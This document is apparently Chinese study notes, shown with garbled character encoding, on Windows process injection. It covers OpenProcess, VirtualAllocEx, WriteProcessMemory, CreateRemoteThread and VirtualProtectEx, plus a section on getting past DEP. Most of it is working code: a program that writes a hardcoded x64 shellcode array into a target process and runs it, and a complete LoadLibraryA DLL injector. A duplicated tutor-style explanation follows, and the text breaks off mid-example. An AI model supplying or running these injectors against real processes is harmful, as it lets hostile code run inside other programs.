# Windows API å‡½æ•°ç”¨æ³•ä¸æ³¨å…¥å®è·µæ•´ç†æ–‡æ¡£

## ğŸ“ ç›®å½•

1. [OpenProcess](#1-openprocess)
2. [CreateProcess](#2-createprocess)
3. [VirtualAllocEx](#3-virtualallocex)
4. [WriteProcessMemory](#4-writeprocessmemory)
5. [CreateRemoteThread](#5-createremotethread)
6. [VirtualProtectEx](#6-virtualprotectex)
7. [å…¸å‹æ³¨å…¥æµç¨‹ç¤ºæ„](#7-å…¸å‹æ³¨å…¥æµç¨‹ç¤ºæ„)
8. [ç»•è¿‡ DEP çš„è¯´æ˜](#8-ç»•è¿‡-dep-çš„æ•°æ®æ‰§è¡Œä¿æŠ¤)

---

## 1. OpenProcess

**ä½œç”¨**ï¼šæ‰“å¼€æŒ‡å®šè¿›ç¨‹å¹¶è·å–å…¶å¥æŸ„ã€‚

```cpp
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
```

### å‚æ•°è¯´æ˜ï¼š

* `dwDesiredAccess`ï¼šè¯·æ±‚è®¿é—®æƒé™ï¼Œå¦‚ `PROCESS_ALL_ACCESS`, `PROCESS_VM_WRITE`, `PROCESS_VM_OPERATION`, `PROCESS_VM_READ`, `PROCESS_CREATE_THREAD` ç­‰ã€‚
* `bInheritHandle`ï¼šæ˜¯å¦å¯è¢«å­è¿›ç¨‹ç»§æ‰¿ã€‚
* `dwProcessId`ï¼šç›®æ ‡è¿›ç¨‹çš„ PIDã€‚

### è¿”å›å€¼ï¼š

æˆåŠŸè¿”å›è¿›ç¨‹å¥æŸ„ï¼Œå¤±è´¥è¿”å› NULLï¼Œå¯è°ƒç”¨ `GetLastError()` è·å–é”™è¯¯ç ã€‚

### ç¤ºä¾‹ï¼š

```cpp
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234); // æ‰“å¼€ PID ä¸º1234çš„è¿›ç¨‹
```

---

## 2. CreateProcess

**ä½œç”¨**ï¼šåˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ã€‚

```cpp
BOOL CreateProcessW(
  LPCWSTR lpApplicationName,
  LPWSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCWSTR lpCurrentDirectory,
  LPSTARTUPINFOW lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

### å¸¸ç”¨å‚æ•°ç®€åŒ–è¯´æ˜ï¼š

* `lpApplicationName`: ç¨‹åºè·¯å¾„ï¼ˆå¯ä¸º NULLï¼‰ã€‚
* `lpCommandLine`: å‘½ä»¤è¡Œå‚æ•°ã€‚
* `lpProcessAttributes`, `lpThreadAttributes`: å®‰å…¨å±æ€§ï¼Œé€šå¸¸ä¸º NULLã€‚
* `bInheritHandles`: æ˜¯å¦ç»§æ‰¿å¥æŸ„ã€‚
* `dwCreationFlags`: å¸¸è§æœ‰ `CREATE_NEW_CONSOLE`, `CREATE_SUSPENDED`ã€‚
* `lpStartupInfo`: å¯åŠ¨ä¿¡æ¯ç»“æ„ä½“ã€‚
* `lpProcessInformation`: æ¥æ”¶è¿”å›çš„è¿›ç¨‹å’Œçº¿ç¨‹å¥æŸ„ä¿¡æ¯ã€‚

### ç¤ºä¾‹ï¼š

```cpp
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
```

---

## 3. VirtualAllocEx

**ä½œç”¨**ï¼šåœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ†é…å†…å­˜ç©ºé—´ã€‚

```cpp
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD flAllocationType,
  DWORD flProtect
);
```

### å‚æ•°è¯´æ˜ï¼š

* `hProcess`: ç›®æ ‡è¿›ç¨‹å¥æŸ„ã€‚
* `lpAddress`: æŒ‡å®šåœ°å€æˆ–ä¸º NULLã€‚
* `dwSize`: åˆ†é…å¤§å°ã€‚
* `flAllocationType`: ä¸€èˆ¬ä¸º `MEM_COMMIT | MEM_RESERVE`ã€‚
* `flProtect`: å†…å­˜ä¿æŠ¤å±æ€§ï¼Œå¦‚ `PAGE_EXECUTE_READWRITE`ã€‚

### ç¤ºä¾‹ï¼š

```cpp
LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

---

## 4. WriteProcessMemory

**ä½œç”¨**ï¼šå°†æ•°æ®å†™å…¥è¿œç¨‹è¿›ç¨‹å†…å­˜ã€‚

```cpp
BOOL WriteProcessMemory(
  HANDLE hProcess,
  LPVOID lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T nSize,
  SIZE_T *lpNumberOfBytesWritten
);
```

### å‚æ•°è¯´æ˜ï¼š

* `hProcess`: ç›®æ ‡è¿›ç¨‹å¥æŸ„ã€‚
* `lpBaseAddress`: å†™å…¥çš„ç›®æ ‡åœ°å€ã€‚
* `lpBuffer`: æœ¬åœ°ç¼“å†²åŒºåœ°å€ã€‚
* `nSize`: å†™å…¥å­—èŠ‚æ•°ã€‚
* `lpNumberOfBytesWritten`: å®é™…å†™å…¥å­—èŠ‚æ•°ã€‚

### ç¤ºä¾‹ï¼š

```cpp
char data[] = "Hello Injected!";
WriteProcessMemory(hProcess, remoteMem, data, sizeof(data), NULL);
```

---

## 5. CreateRemoteThread

**ä½œç”¨**ï¼šåœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ›å»ºçº¿ç¨‹ã€‚

```cpp
HANDLE CreateRemoteThread(
  HANDLE hProcess,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  SIZE_T dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID lpParameter,
  DWORD dwCreationFlags,
  LPDWORD lpThreadId
);
```

### å‚æ•°è¯´æ˜ï¼š

* `hProcess`: ç›®æ ‡è¿›ç¨‹å¥æŸ„ã€‚
* `lpStartAddress`: è¦æ‰§è¡Œçš„è¿œç¨‹å‡½æ•°åœ°å€ã€‚
* `lpParameter`: ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°ã€‚
* `dwCreationFlags`: é€šå¸¸ä¸º 0ï¼ˆç«‹å³è¿è¡Œï¼‰æˆ– `CREATE_SUSPENDED`ã€‚
* `lpThreadId`: å¯ä¸º NULLã€‚

### ç¤ºä¾‹ï¼š

```cpp
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteFuncAddr, remoteMem, 0, NULL);
```

---

## 6. VirtualProtectEx

**ä½œç”¨**ï¼šä¿®æ”¹è¿œç¨‹è¿›ç¨‹æŸåŒºåŸŸå†…å­˜çš„ä¿æŠ¤å±æ€§ã€‚

```cpp
BOOL VirtualProtectEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD flNewProtect,
  PDWORD lpflOldProtect
);
```

### å‚æ•°è¯´æ˜ï¼š

* `hProcess`: è¿›ç¨‹å¥æŸ„ã€‚
* `lpAddress`: å†…å­˜åœ°å€ã€‚
* `dwSize`: ä¿®æ”¹å¤§å°ã€‚
* `flNewProtect`: æ–°çš„å†…å­˜ä¿æŠ¤å±æ€§ã€‚
* `lpflOldProtect`: ä¿å­˜æ—§ä¿æŠ¤å±æ€§ã€‚

### ç¤ºä¾‹ï¼š

```cpp
DWORD oldProtect;
VirtualProtectEx(hProcess, remoteMem, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
```

---

## 7. å…¸å‹æ³¨å…¥æµç¨‹ç¤ºæ„

1. è·å–ç›®æ ‡è¿›ç¨‹ PIDã€‚
2. ä½¿ç”¨ `OpenProcess` æ‰“å¼€ç›®æ ‡è¿›ç¨‹ã€‚
3. ä½¿ç”¨ `VirtualAllocEx` åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ†é…å†…å­˜ã€‚
4. ä½¿ç”¨ `WriteProcessMemory` å†™å…¥ DLL è·¯å¾„æˆ– Shellcodeã€‚
5. ä½¿ç”¨ `GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA")` è·å–å‡½æ•°åœ°å€ï¼ˆå¦‚æœæ˜¯ DLL æ³¨å…¥ï¼‰ã€‚
6. ä½¿ç”¨ `CreateRemoteThread` å¯åŠ¨è¿œç¨‹çº¿ç¨‹æ‰§è¡Œ LoadLibraryA æˆ– Shellcodeã€‚
7. å¯é€‰ï¼šä½¿ç”¨ `VirtualProtectEx` ä¿®æ”¹å†…å­˜å±æ€§ä»¥æ‰§è¡Œä»£ç ã€‚

---

## 8. ç»•è¿‡ DEP çš„æ•°æ®æ‰§è¡Œä¿æŠ¤

Windows çš„ DEP (Data Execution Prevention) ä¸å…è®¸æ‰§è¡Œéä»£ç æ®µå†…å­˜ã€‚
ä¸ºç»•è¿‡ï¼š

* åˆ†é…å†…å­˜æ—¶ä½¿ç”¨ `PAGE_EXECUTE_READWRITE`ã€‚
* æˆ–è€…ä½¿ç”¨ `VirtualProtectEx` ä¿®æ”¹å†…å­˜å±æ€§ã€‚

### ç¤ºä¾‹æµç¨‹ï¼š

```cpp
// åˆ†é…å¯æ‰§è¡Œå†…å­˜
LPVOID shellcodeMem = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// å†™å…¥ Shellcode
WriteProcessMemory(hProcess, shellcodeMem, shellcode, shellcodeSize, NULL);

// ä¿®æ”¹å†…å­˜ä¿æŠ¤å±æ€§ä¸ºå¯æ‰§è¡Œ
DWORD oldProtect;
VirtualProtectEx(hProcess, shellcodeMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

// åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡Œ shellcode
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeMem, NULL, 0, NULL);
```

---

# åˆ›å»ºè¿›ç¨‹

```cpp
// åˆ›å»ºè¿›ç¨‹.cpp : æ­¤æ–‡ä»¶åŒ…å« "main" å‡½æ•°ã€‚ç¨‹åºæ‰§è¡Œå°†åœ¨æ­¤å¤„å¼€å§‹å¹¶ç»“æŸã€‚
//

#include <iostream>
#include <Windows.h>

int main()
{

    STARTUPINFO si2{};
    si2.cb = sizeof(si2);
    PROCESS_INFORMATION pi2{};
    WCHAR app[] = L"C:\\Windows\\System32\\notepad.exe";//
    std::cout << CreateProcessW(app, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si2, &pi2) << std::endl;
    std::cout << GetLastError() << std::endl;
    WaitForSingleObject(pi2.hProcess, INFINITE);

    STARTUPINFO si{};//ä¸ä¸€å®šè¦è®¾ç½®si.cbä¸ºç»“æ„å¤§å°ï¼Œ è¿™ä¸ªå¤§å°ä¼šå½±å“çª—å£æ ‡é¢˜ï¼Œé‡å®šå‘ä¹‹ç±»çš„æ•ˆæœ
    PROCESS_INFORMATION pi;
    //si.lpTitle = (LPWSTR)L"æ ‡é¢˜";


    ZeroMemory(&pi, sizeof(pi));
    WCHAR cmd[] = L"CMD.EXE";
    std::cout << CreateProcessW(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    ) << std::endl;
    WaitForSingleObject(pi.hProcess, INFINITE);
    std::cout << GetLastError() << std::endl;
}
```



# æ³¨å…¥è¿›ç¨‹å¹¶æ‰§è¡ŒSHELLCODE

```cpp
// è¿›ç¨‹æ³¨å…¥.cpp : æ­¤æ–‡ä»¶åŒ…å« "main" å‡½æ•°ã€‚ç¨‹åºæ‰§è¡Œå°†åœ¨æ­¤å¤„å¼€å§‹å¹¶ç»“æŸã€‚
//

#include <iostream>
#include <Windows.h>

int main()
{
    unsigned char data[] = {
    0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0xEC,
    0x48, 0x83, 0xEC, 0x78, 0x45, 0x33, 0xC0, 0xC7, 0x45, 0xB0, 0x55, 0x53, 0x45, 0x52, 0x44, 0x88,
    0x45, 0xBA, 0xC7, 0x45, 0xB4, 0x33, 0x32, 0x2E, 0x44, 0x66, 0xC7, 0x45, 0xB8, 0x4C, 0x4C, 0xC7,
    0x45, 0xC0, 0x4D, 0x65, 0x73, 0x73, 0xC7, 0x45, 0xC4, 0x61, 0x67, 0x65, 0x42, 0xC7, 0x45, 0xC8,
    0x6F, 0x78, 0x41, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xD0,
    0x4C, 0x6F, 0x61, 0x64, 0xC7, 0x45, 0xD4, 0x4C, 0x69, 0x62, 0x72, 0xC7, 0x45, 0xD8, 0x61, 0x72,
    0x79, 0x41, 0x4C, 0x8B, 0x78, 0x18, 0x49, 0x83, 0xC7, 0x20, 0x44, 0x88, 0x45, 0xDC, 0xC7, 0x45,
    0xE0, 0x47, 0x65, 0x74, 0x50, 0xC7, 0x45, 0xE4, 0x72, 0x6F, 0x63, 0x41, 0xC7, 0x45, 0xE8, 0x64,
    0x64, 0x72, 0x65, 0x4D, 0x8B, 0x77, 0x08, 0x66, 0xC7, 0x45, 0xEC, 0x73, 0x73, 0x44, 0x88, 0x45,
    0xEE, 0x4C, 0x89, 0x45, 0x60, 0x4C, 0x89, 0x45, 0x58, 0xE9, 0xC4, 0x00, 0x00, 0x00, 0x49, 0x8B,
    0x76, 0x20, 0x48, 0x63, 0x46, 0x3C, 0x48, 0x8B, 0x84, 0x30, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B,
    0xC8, 0x48, 0xC1, 0xE9, 0x20, 0x85, 0xC9, 0x0F, 0x84, 0xA1, 0x00, 0x00, 0x00, 0x8B, 0xC8, 0x44,
    0x89, 0x45, 0x48, 0x8B, 0x44, 0x31, 0x18, 0x89, 0x45, 0x50, 0x85, 0xC0, 0x0F, 0x84, 0x8C, 0x00,
    0x00, 0x00, 0x44, 0x8B, 0x64, 0x31, 0x24, 0x8B, 0x54, 0x31, 0x1C, 0x4C, 0x03, 0xE6, 0x44, 0x8B,
    0x6C, 0x31, 0x20, 0x4C, 0x03, 0xEE, 0x48, 0x89, 0x55, 0xA8, 0x41, 0x0F, 0xB7, 0x04, 0x24, 0x41,
    0x8B, 0x5D, 0x00, 0x48, 0x03, 0xDE, 0x48, 0x8D, 0x0C, 0x82, 0x48, 0x8B, 0xD3, 0x8B, 0x3C, 0x31,
    0x48, 0x8D, 0x4D, 0xD0, 0x48, 0x03, 0xFE, 0xE8, 0x90, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x48, 0x8B,
    0xCF, 0x48, 0x8B, 0xD3, 0x48, 0x0F, 0x44, 0x4D, 0x58, 0x48, 0x89, 0x4D, 0x58, 0x48, 0x8D, 0x4D,
    0xE0, 0xE8, 0x76, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC0, 0x85, 0xC0, 0x48, 0x0F, 0x44, 0x7D, 0x60,
    0x48, 0x8B, 0xDF, 0x48, 0x89, 0x5D, 0x60, 0x48, 0x85, 0xFF, 0x74, 0x09, 0x48, 0x8B, 0x55, 0x58,
    0x48, 0x85, 0xD2, 0x75, 0x28, 0x8B, 0x45, 0x48, 0x49, 0x83, 0xC5, 0x04, 0x48, 0x8B, 0x55, 0xA8,
    0xFF, 0xC0, 0x49, 0x83, 0xC4, 0x02, 0x89, 0x45, 0x48, 0x3B, 0x45, 0x50, 0x72, 0x8C, 0x4D, 0x8B,
    0x76, 0x08, 0x4D, 0x3B, 0xF7, 0x0F, 0x85, 0x33, 0xFF, 0xFF, 0xFF, 0xEB, 0x1B, 0x48, 0x8D, 0x4D,
    0xB0, 0xFF, 0xD2, 0x48, 0x8D, 0x55, 0xC0, 0x48, 0x8B, 0xC8, 0xFF, 0xD3, 0x45, 0x33, 0xC9, 0x45,
    0x33, 0xC0, 0x33, 0xD2, 0x33, 0xC9, 0xFF, 0xD0, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78, 0x41, 0x5F,
    0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0x5D, 0xC3, 0xCC, 0x44, 0x8A, 0x01, 0x33,
    0xC0, 0x4C, 0x8B, 0xDA, 0x44, 0x8B, 0xD0, 0x45, 0x84, 0xC0, 0x74, 0x0E, 0x4C, 0x8B, 0xC9, 0x49,
    0xFF, 0xC1, 0x41, 0xFF, 0xC2, 0x41, 0x38, 0x01, 0x75, 0xF5, 0x44, 0x8B, 0xC8, 0xEB, 0x06, 0x41,
    0xFF, 0xC1, 0x48, 0xFF, 0xC2, 0x38, 0x02, 0x75, 0xF6, 0x45, 0x3B, 0xD1, 0x75, 0x23, 0x8B, 0xD0,
    0x45, 0x84, 0xC0, 0x74, 0x16, 0x4C, 0x2B, 0xD9, 0x46, 0x3A, 0x04, 0x19, 0x75, 0x0D, 0x48, 0xFF,
    0xC1, 0xFF, 0xC2, 0x44, 0x8A, 0x01, 0x45, 0x84, 0xC0, 0x75, 0xED, 0x41, 0x3B, 0xD2, 0x0F, 0x94,
    0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    DWORD pid = 3008;  // ç›®æ ‡è¿›ç¨‹ PIDï¼Œæ›¿æ¢ä¸ºçœŸå® PID

    // æ‰“å¼€ç›®æ ‡è¿›ç¨‹ï¼Œç”³è¯·è¯»å†™å’Œæ“ä½œå†…å­˜æƒé™
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
        FALSE,
        pid
    );

    if (hProcess == NULL) {
        printf("æ‰“å¼€è¿›ç¨‹å¤±è´¥ï¼Œé”™è¯¯ç : %lu\n", GetLastError());
        return 1;
    }

    printf("æˆåŠŸæ‰“å¼€è¿›ç¨‹ï¼Œå¥æŸ„: %p\n", hProcess);

    //åœ¨è¿›ç¨‹ä¸­æ‰§è¡Œä»£ç 
    SIZE_T write_bytes;
    LPVOID imagebase = VirtualAllocEx(hProcess, NULL, sizeof(data),MEM_COMMIT ,PAGE_EXECUTE_READWRITE);//åœ¨ç›®æ ‡ä¸­ç”³è¯·å†…å­˜
    WriteProcessMemory(hProcess,imagebase,data,sizeof(data), &write_bytes);//æŠŠæ•°æ®å†™è¿›ç›®æ ‡å†…å­˜
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(imagebase), NULL, 0, NULL);//åœ¨ç›®æ ‡å†…å­˜ä¸­æ‰§è¡Œçº¿ç¨‹

    // ç”¨å®Œè¦å…³é—­å¥æŸ„
    CloseHandle(hProcess);
    return 0;
}
```

# å‘è¿›ç¨‹ä¸­å†™å…¥å­—ç¬¦ä¸²æ•°æ®ï¼Œ å¹¶æŠŠå­—ç¬¦ä¸²æ•°æ®å½“æˆå‚æ•°è°ƒç”¨

```cpp
#include <Windows.h>
#include <iostream>

bool InjectDLL(DWORD pid)
{
    const char* dllPath = "C:\\Path\\To\\injectdll.dll";  // è¿™é‡Œå†™æ­»DLLè·¯å¾„

    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (!hProcess)
    {
        std::cerr << "æ‰“å¼€è¿›ç¨‹å¤±è´¥ï¼Œé”™è¯¯ç : " << GetLastError() << std::endl;
        return false;
    }

    size_t pathLen = strlen(dllPath) + 1;
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, pathLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!remoteMem)
    {
        std::cerr << "åˆ†é…å†…å­˜å¤±è´¥ï¼Œé”™è¯¯ç : " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteMem, dllPath, pathLen, &bytesWritten) || bytesWritten != pathLen)
    {
        std::cerr << "å†™å…¥å†…å­˜å¤±è´¥ï¼Œé”™è¯¯ç : " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!loadLibAddr)
    {
        std::cerr << "è·å– LoadLibraryA åœ°å€å¤±è´¥" << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, remoteMem, 0, NULL);
    //remoteMemä¸ºå†™åˆ°ç›®å½•é‡Œçš„å­—ç¬¦ä¸²ï¼Œå½“æˆå‚æ•°è°ƒç”¨
    //(LPTHREAD_START_ROUTINE)loadLibAddr,  // çº¿ç¨‹å…¥å£ï¼ŒLoadLibraryAå‡½æ•°åœ°å€
    //remoteMem,                            // ä¼ ç»™LoadLibraryAçš„å‚æ•°ï¼ˆDLLè·¯å¾„å­—ç¬¦ä¸²åœ°å€ï¼‰
    if (!hThread)
    {
        std::cerr << "åˆ›å»ºè¿œç¨‹çº¿ç¨‹å¤±è´¥ï¼Œé”™è¯¯ç : " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "æ³¨å…¥æˆåŠŸï¼" << std::endl;
    return true;
}

int main()
{
    DWORD pid;
    std::cout << "è¯·è¾“å…¥ç›®æ ‡è¿›ç¨‹ PID: ";
    std::cin >> pid;

    if (!InjectDLL(pid))
    {
        std::cerr << "æ³¨å…¥å¤±è´¥ï¼" << std::endl;
        return 1;
    }
    return 0;
}
```

```cpp
HANDLE hThread = CreateRemoteThread(
    hProcess,               // ç›®æ ‡è¿›ç¨‹å¥æŸ„
    NULL,                   // é»˜è®¤å®‰å…¨å±æ€§
    0,                      // é»˜è®¤å †æ ˆå¤§å°
    (LPTHREAD_START_ROUTINE)loadLibAddr, // çº¿ç¨‹èµ·å§‹åœ°å€ï¼ˆå‡½æ•°æŒ‡é’ˆï¼Œä¾‹å¦‚ LoadLibraryA çš„åœ°å€ï¼‰
    remoteMem,              // çº¿ç¨‹å‚æ•°ï¼ˆä¼ ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•°ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²åœ°å€ï¼‰
    0,                      // é»˜è®¤åˆ›å»ºæ ‡å¿—ï¼ˆç«‹å³æ‰§è¡Œï¼‰
    NULL                    // ä¸å…³å¿ƒçº¿ç¨‹ ID
);
```

| å‚æ•°                                    | è¯´æ˜                                                                  |
| ------------------------------------- | ------------------------------------------------------------------- |
| `hProcess`                            | ç›®æ ‡è¿›ç¨‹çš„å¥æŸ„ï¼Œé€šå¸¸é€šè¿‡ `OpenProcess(PROCESS_ALL_ACCESS, ...)` è·å–ã€‚             |
| `NULL`                                | å®‰å…¨å±æ€§ï¼Œä¸€èˆ¬ä¸º `NULL` è¡¨ç¤ºé»˜è®¤ã€‚                                               |
| `0`                                   | çº¿ç¨‹çš„å †æ ˆå¤§å°ï¼Œ`0` è¡¨ç¤ºä½¿ç”¨é»˜è®¤å¤§å°ã€‚                                               |
| `(LPTHREAD_START_ROUTINE)loadLibAddr` | è¦åœ¨ç›®æ ‡è¿›ç¨‹ä¸­æ‰§è¡Œçš„å‡½æ•°åœ°å€ï¼Œé€šå¸¸æ˜¯ `LoadLibraryA` çš„åœ°å€ã€‚éœ€è¦ä½¿ç”¨ `GetProcAddress` è·å–åå†ä¼ å…¥ã€‚ |
| `remoteMem`                           | å‡½æ•°çš„å‚æ•°ï¼Œåœ¨è¿™é‡Œæ˜¯è¿œç¨‹è¿›ç¨‹å†…å­˜åœ°å€ï¼Œé‡Œé¢å†™å…¥çš„æ˜¯ DLL è·¯å¾„çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚å†™å…¥ `"C:\\MyDll.dll"`ã€‚        |
| `0`                                   | çº¿ç¨‹åˆ›å»ºæ ‡å¿—ï¼Œ`0` è¡¨ç¤ºçº¿ç¨‹åˆ›å»ºåç«‹å³è¿è¡Œã€‚                                             |
| `NULL`                                | å¦‚æœä½ ä¸å…³å¿ƒçº¿ç¨‹ IDï¼Œå¯ä»¥è®¾ç½®ä¸º NULLã€‚                                             |

æ˜¯çš„ï¼Œä½ çš„è§£é‡Š **åŸºæœ¬æ˜¯å¯¹çš„**ï¼Œä¸è¿‡æˆ‘æ¥å¸®ä½ æ›´å‡†ç¡®åœ°è§£é‡Šæ¯ä¸ªéƒ¨åˆ†ï¼š

---

### âœ… ä»£ç ï¼š

```cpp
HANDLE hThread = CreateRemoteThread(
    hProcess,               // ç›®æ ‡è¿›ç¨‹å¥æŸ„
    NULL,                   // é»˜è®¤å®‰å…¨å±æ€§
    0,                      // é»˜è®¤å †æ ˆå¤§å°
    (LPTHREAD_START_ROUTINE)loadLibAddr, // çº¿ç¨‹èµ·å§‹åœ°å€ï¼ˆå‡½æ•°æŒ‡é’ˆï¼Œä¾‹å¦‚ LoadLibraryA çš„åœ°å€ï¼‰
    remoteMem,              // çº¿ç¨‹å‚æ•°ï¼ˆä¼ ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•°ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²åœ°å€ï¼‰
    0,                      // é»˜è®¤åˆ›å»ºæ ‡å¿—ï¼ˆç«‹å³æ‰§è¡Œï¼‰
    NULL                    // ä¸å…³å¿ƒçº¿ç¨‹ ID
);
```

---

### âœ… å‚æ•°è§£é‡Šï¼š

| å‚æ•°                                    | è¯´æ˜                                                                  |
| ------------------------------------- | ------------------------------------------------------------------- |
| `hProcess`                            | ç›®æ ‡è¿›ç¨‹çš„å¥æŸ„ï¼Œé€šå¸¸é€šè¿‡ `OpenProcess(PROCESS_ALL_ACCESS, ...)` è·å–ã€‚             |
| `NULL`                                | å®‰å…¨å±æ€§ï¼Œä¸€èˆ¬ä¸º `NULL` è¡¨ç¤ºé»˜è®¤ã€‚                                               |
| `0`                                   | çº¿ç¨‹çš„å †æ ˆå¤§å°ï¼Œ`0` è¡¨ç¤ºä½¿ç”¨é»˜è®¤å¤§å°ã€‚                                               |
| `(LPTHREAD_START_ROUTINE)loadLibAddr` | è¦åœ¨ç›®æ ‡è¿›ç¨‹ä¸­æ‰§è¡Œçš„å‡½æ•°åœ°å€ï¼Œé€šå¸¸æ˜¯ `LoadLibraryA` çš„åœ°å€ã€‚éœ€è¦ä½¿ç”¨ `GetProcAddress` è·å–åå†ä¼ å…¥ã€‚ |
| `remoteMem`                           | å‡½æ•°çš„å‚æ•°ï¼Œåœ¨è¿™é‡Œæ˜¯è¿œç¨‹è¿›ç¨‹å†…å­˜åœ°å€ï¼Œé‡Œé¢å†™å…¥çš„æ˜¯ DLL è·¯å¾„çš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚å†™å…¥ `"C:\\MyDll.dll"`ã€‚        |
| `0`                                   | çº¿ç¨‹åˆ›å»ºæ ‡å¿—ï¼Œ`0` è¡¨ç¤ºçº¿ç¨‹åˆ›å»ºåç«‹å³è¿è¡Œã€‚                                             |
| `NULL`                                | å¦‚æœä½ ä¸å…³å¿ƒçº¿ç¨‹ IDï¼Œå¯ä»¥è®¾ç½®ä¸º NULLã€‚                                             |

---

### âœ… æ³¨å…¥æµç¨‹ç®€è¦è¯´æ˜ï¼ˆä½ è¿™å¥ä»£ç å¤„äºæ•´ä¸ªæµç¨‹çš„ä¸­é—´ï¼‰ï¼š

1. ä½¿ç”¨ `OpenProcess` è·å–ç›®æ ‡è¿›ç¨‹å¥æŸ„ã€‚
2. ä½¿ç”¨ `VirtualAllocEx` ä¸º DLL è·¯å¾„åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ†é…å†…å­˜ã€‚
3. ä½¿ç”¨ `WriteProcessMemory` æŠŠ DLL è·¯å¾„å­—ç¬¦ä¸²å†™å…¥ä¸Šé¢çš„å†…å­˜ã€‚
4. ä½¿ç”¨ `GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA")` è·å– `LoadLibraryA` åœ°å€ã€‚
5. ä½¿ç”¨ `CreateRemoteThread` åˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼Œæ‰§è¡Œ `LoadLibraryA(remoteMem)`ï¼ŒåŠ è½½ DLLã€‚

---

### âœ… ç¤ºä¾‹å›¾è§£ï¼š

```cpp
// æ­¥éª¤ 1: æ‰“å¼€ç›®æ ‡è¿›ç¨‹
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);

// æ­¥éª¤ 2: åˆ†é…è¿œç¨‹å†…å­˜
